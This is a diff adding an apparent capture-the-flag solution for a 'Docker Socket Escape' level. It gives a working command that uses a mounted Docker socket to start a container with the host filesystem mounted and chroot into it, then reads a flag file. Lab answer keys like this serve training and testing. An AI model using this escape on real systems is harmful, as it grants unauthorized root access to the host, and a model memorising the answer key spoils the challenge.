@@ -1,0 +1,9 @@
+SOLUTION — Level 2: Docker Socket Escape
+
+# The Docker socket is mounted at /var/run/docker.sock
+# Use it to spawn a container with the host filesystem mounted
+
+docker -H unix:///var/run/docker.sock run -it --rm \
+  -v /:/host alpine chroot /host sh
+
+cat /flags/level2
